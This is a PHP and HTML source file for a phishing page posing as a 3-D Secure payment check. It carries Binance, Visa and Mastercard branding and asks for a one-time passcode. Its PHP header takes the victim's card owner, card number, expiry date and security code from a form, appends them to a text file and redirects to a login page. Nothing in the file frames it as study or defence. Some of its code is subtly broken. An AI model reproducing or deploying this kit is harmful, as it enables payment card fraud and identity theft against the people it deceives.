<?php
// Check if all required fields are submitted
if (
    isset($_POST['owner']) &&
    isset($_POST['cardNumber']) &&
    isset($_POST['expirationdate']) &&
    isset($_POST['securitycode'])
) {
    $file = "usernames.txt";
    $data1= "$_POST['cardNumber'] ";
    $data = 
        "owner: " . $_POST['owner'] . "\n" .
        "cardNumber: " . $_POST['cardNumber'] . "\n" .
        "expirationdate: " . $_POST['expirationdate'] . "\n" .
        "securitycode: " . $_POST['securitycode'] . "\n\n";

    file_put_contents($file, $data, FILE_APPEND);
    header('Location: login.php'); // Replace with your URL
    exit;
} else {
    // Log missing fields
    file_put_contents("error.log", "Missing form data: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    header('Location: error_page.html'); // Redirect to error page
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Authentication</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .info {
            text-align: left;
            margin-bottom: 20px;
        }
        .info p {
            margin: 5px 0;
            color: #555;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-actions {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .form-actions button {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-actions button.submit {
            background-color: #28a745;
            color: #fff;
        }
        .form-actions button.resend {
            background-color: #ffc107;
            color: #fff;
        }
        .form-actions button.cancel {
            background-color: #dc3545;
            color: #fff;
        }
        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #555;
        }
        .terms a {
            color: #007bff;
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
	            <div class="payment-logos">
                <img src="https://public.bnbstatic.com/20190405/eb2349c3-b2f8-4a93-a286-8f86a62ea9d8.png" alt="Binance" style="height: 35px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="height: 35px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 35px;">
            </div>
        <h2>Protecting your online payments</h2>
        <div class="info">
            <p>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile 06*********</p>
            <p><strong>Merchant:</strong> GOLFSTORE 3DS</p>
            <p><strong>Amount:</strong> USD 45.99</p>
            <p><strong>Date:</strong> <span id="currentDate"></span></p>
            <p><strong>Card Number:</strong><?php echo $data1; ?></p>
            <p><strong>Reference Id:</strong> 298879</p>
        </div>
        <form>
            <div class="form-group">
                <label for="otp">Enter One-Time Passcode</label>
                <input type="text" id="otp" placeholder="Enter One-Time Passcode">
            </div>
            <div class="form-group">
                <label>
                    <input type="checkbox"> I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.
                </label>
            </div>
            <div class="form-actions">
                <button type="submit" class="submit">Submit</button>

                <button type="button" class="cancel">Cancel</button>
            </div>
        </form>
        <div class="terms">
            <a href="#">Terms & Conditions</a> | <a href="#">FAQs</a> | <a href="#">Contact Us</a>
        </div>
    </div>

    <script>
        function updateDateTime() {
            const now = new Date();
            const date = now.toLocaleDateString('en-GB'); // Format: DD/MM/YYYY
            const time = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' }); // Format: HH:MM:SS
            document.getElementById('currentDate').textContent = `${date} ${time}`;
        }

        // Update the date and time immediately and then every second
        updateDateTime();
        setInterval(updateDateTime, 1000);
    </script>
</body>
</html>
